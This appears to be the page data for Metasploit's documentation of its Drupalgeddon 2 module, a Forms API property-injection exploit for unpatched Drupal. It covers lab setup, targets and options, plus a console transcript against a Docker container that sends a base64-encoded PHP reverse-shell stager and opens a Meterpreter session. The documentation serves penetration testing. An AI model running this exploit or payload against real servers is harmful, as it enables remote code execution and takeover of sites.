{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/unix/webapp/drupal_drupalgeddon2","result":{"data":{"moduleMetadataJson":{"id":"a980cff0-8cd6-5831-a795-3f4dfada8c0c","name":"Drupal Drupalgeddon 2 Forms API Property Injection","fullname":"exploit/unix/webapp/drupal_drupalgeddon2","description":"This module exploits a Drupal property injection in the Forms API.\n\n        Drupal 6.x, < 7.58, 8.2.x, < 8.3.9, < 8.4.6, and < 8.5.1 are vulnerable.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/unix/webapp/drupal_drupalgeddon2","documentationSlug":"/modules/documentation/exploit/unix/webapp/drupal_drupalgeddon2","referencesSlug":"/modules/references/exploit/unix/webapp/drupal_drupalgeddon2"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>This module exploits a Drupal property injection in the Forms API.\nDrupal 6.x, &#x3C; 7.58, 8.2.x, &#x3C; 8.3.9, &#x3C; 8.4.6, and &#x3C; 8.5.1 are vulnerable.</p>\n<h2 id=\"setup\" style=\"position:relative;\"><a href=\"#setup\" aria-label=\"setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h2>\n<p>Use the provided Docker images here: <a href=\"https://hub.docker.com/_/drupal/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://hub.docker.com/_/drupal/</a>.</p>\n<p>Alternatively, you may use TurnKey Linux's distributions:</p>\n<p>Drupal 7.54: <a href=\"http://mirror.turnkeylinux.org/turnkeylinux/images/iso/turnkey-drupal7-14.2-jessie-amd64.iso\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://mirror.turnkeylinux.org/turnkeylinux/images/iso/turnkey-drupal7-14.2-jessie-amd64.iso</a>\nDrupal 8.3.1: <a href=\"http://mirror.turnkeylinux.org/turnkeylinux/images/iso/turnkey-drupal8-14.2-jessie-amd64.iso\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://mirror.turnkeylinux.org/turnkeylinux/images/iso/turnkey-drupal8-14.2-jessie-amd64.iso</a></p>\n<p>Tested on 7.57 and 8.4.5 in Docker and 7.54 and 8.3.1 in TurnKey.</p>\n<h2 id=\"targets\" style=\"position:relative;\"><a href=\"#targets\" aria-label=\"targets permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Targets</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">Id  Name\n--  ----\n0   Automatic (PHP In-Memory)\n1   Automatic (PHP Dropper)\n2   Automatic (Unix In-Memory)\n3   Automatic (Linux Dropper)\n4   Drupal 7.x (PHP In-Memory)\n5   Drupal 7.x (PHP Dropper)\n6   Drupal 7.x (Unix In-Memory)\n7   Drupal 7.x (Linux Dropper)\n8   Drupal 8.x (PHP In-Memory)\n9   Drupal 8.x (PHP Dropper)\n10  Drupal 8.x (Unix In-Memory)\n11  Drupal 8.x (Linux Dropper)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Automatic targeting means the Drupal version will be detected first.\nTargets with a specific version will do as they're told (regardless of\nwhat the server is running).</p>\n<p>Dropper targets write to disk. In-memory targets don't. Be mindful of\nshowing up in someone's process list, though. A dropper might be more\nviable in that regard.</p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>TARGETURI</strong></p>\n<p>Set this to the remote path of the vulnerable Drupal install. Defaults\nto <code class=\"language-text\">/</code> for the web root.</p>\n<p><strong>PHP_FUNC</strong></p>\n<p>Set this to the PHP function you'd like to execute. Defaults to\n<code class=\"language-text\">passthru</code>.</p>\n<p><strong>DUMP_OUTPUT</strong></p>\n<p>Enable this if you'd like to see HTTP responses, including command\noutput. Defaults to <code class=\"language-text\">false</code> unless <code class=\"language-text\">cmd/unix/generic</code> is your payload.</p>\n<p><strong>VERBOSE</strong></p>\n<p>Enable this to show what function and command were executed. Defaults to\n<code class=\"language-text\">false</code> due to the sometimes excessive output.</p>\n<p><strong>ForceExploit</strong></p>\n<p>Enable this to force exploitation regardless of the check result.\nDefaults to <code class=\"language-text\">false</code>, meaning the check result is respected.</p>\n<p><strong>WritableDir</strong></p>\n<p>Set this to a writable directory without <code class=\"language-text\">noexec</code> for binary payloads.\nDefaults to <code class=\"language-text\">/tmp</code>, but other options may include <code class=\"language-text\">/var/tmp</code> and\n<code class=\"language-text\">/dev/shm</code>.</p>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<p>Drupal 7.57 from the Docker image is tested below.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2\nmsf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhost 172.17.0.3\nrhost =&gt; 172.17.0.3\nmsf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set verbose true\nverbose =&gt; true\nmsf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; check\n\n[*] Drupal 7 targeted at http://172.17.0.3/\n[+] Drupal appears unpatched in CHANGELOG.txt\n[*] Executing with printf(): sdHl4fLONOKfVZL1cEvXuJCuSkue\n[+] Drupal is vulnerable to code execution\n[+] 172.17.0.3:80 The target is vulnerable.\nmsf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run\n\n[*] Started reverse TCP handler on 172.17.0.1:4444\n[*] Drupal 7 targeted at http://172.17.0.3/\n[+] Drupal appears unpatched in CHANGELOG.txt\n[*] Executing with printf(): paAHBb9jyovEnLrrT5lMIB\n[+] Drupal is vulnerable to code execution\n[*] Executing with assert(): eval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzE3Mi4xNy4wLjEnOyAkcG9ydCA9IDQ0NDQ7IGlmICgoJGYgPSAnc3RyZWFtX3NvY2tldF9jbGllbnQnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigidGNwOi8veyRpcH06eyRwb3J0fSIpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gaWYgKCEkcyAmJiAoJGYgPSAnZnNvY2tvcGVuJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoJGlwLCAkcG9ydCk7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdzb2NrZXRfY3JlYXRlJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoQUZfSU5FVCwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOyAkcmVzID0gQHNvY2tldF9jb25uZWN0KCRzLCAkaXAsICRwb3J0KTsgaWYgKCEkcmVzKSB7IGRpZSgpOyB9ICRzX3R5cGUgPSAnc29ja2V0JzsgfSBpZiAoISRzX3R5cGUpIHsgZGllKCdubyBzb2NrZXQgZnVuY3MnKTsgfSBpZiAoISRzKSB7IGRpZSgnbm8gc29ja2V0Jyk7IH0gc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRsZW4gPSBmcmVhZCgkcywgNCk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiAkbGVuID0gc29ja2V0X3JlYWQoJHMsIDQpOyBicmVhazsgfSBpZiAoISRsZW4pIHsgZGllKCk7IH0gJGEgPSB1bnBhY2soIk5s.ZW4iLCAkbGVuKTsgJGxlbiA9ICRhWydsZW4nXTsgJGIgPSAnJzsgd2hpbGUgKHN0cmxlbigkYikgPCAkbGVuKSB7IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkYiAuPSBmcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRiIC49IHNvY2tldF9yZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgfSB9ICRHTE9CQUxTWydtc2dzb2NrJ10gPSAkczsgJEdMT0JBTFNbJ21zZ3NvY2tfdHlwZSddID0gJHNfdHlwZTsgaWYgKGV4dGVuc2lvbl9sb2FkZWQoJ3N1aG9zaW4nKSAmJiBpbmlfZ2V0KCdzdWhvc2luLmV4ZWN1dG9yLmRpc2FibGVfZXZhbCcpKSB7ICRzdWhvc2luX2J5cGFzcz1jcmVhdGVfZnVuY3Rpb24oJycsICRiKTsgJHN1aG9zaW5fYnlwYXNzKCk7IH0gZWxzZSB7IGV2YWwoJGIpOyB9IGRpZSgpOw));\n[*] Sending stage (37775 bytes) to 172.17.0.3\n[*] Meterpreter session 1 opened (172.17.0.1:4444 -&gt; 172.17.0.3:46654) at 2018-04-24 23:25:17 -0500\n\nmeterpreter &gt; getuid\nServer username: www-data (33)\nmeterpreter &gt; sysinfo\nComputer    : b3a405d5568a\nOS          : [redacted]\nMeterpreter : php/linux\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"a980cff0-8cd6-5831-a795-3f4dfada8c0c"}}}